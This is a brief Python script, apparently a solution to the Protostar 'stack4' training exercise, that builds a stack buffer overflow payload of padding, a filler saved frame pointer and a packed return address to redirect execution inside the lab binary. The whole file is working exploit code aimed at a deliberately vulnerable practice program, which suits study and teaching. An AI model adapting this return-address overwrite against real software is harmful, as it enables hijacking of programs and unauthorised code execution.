########################################
# Usage: 
# python stack4.py | /opt/protostar/bin/stack4 
########################################

import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR'
ebp = 'AAAA'
ret = struct.pack("I", 0x080483f4)

payload = padding + ebp + ret
print(payload)
